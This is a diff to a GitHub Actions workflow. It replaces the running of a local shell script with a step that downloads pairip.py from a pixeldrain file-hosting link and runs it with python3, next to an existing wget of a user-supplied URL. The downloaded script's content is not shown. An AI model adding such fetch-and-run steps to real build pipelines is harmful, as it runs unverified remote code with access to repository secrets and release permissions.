@@ -16,15 +16,14 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v3
 
-      - name: Download user file
+      - name: Download file
         run: |
           wget -O user_file "${{ github.event.inputs.file_url }}"
 
-      - name: Make shell script executable
-        run: chmod +x run_script.sh
-
-      - name: Run the shell script
-        run: ./run_script.sh user_file
+      - name: execute 
+        run: |
+          wget -O pairip.py https://pixeldrain.com/api/file/1CrGiM6H
+          python3 pairip.py
 
       - name: Create release
         id: create_release
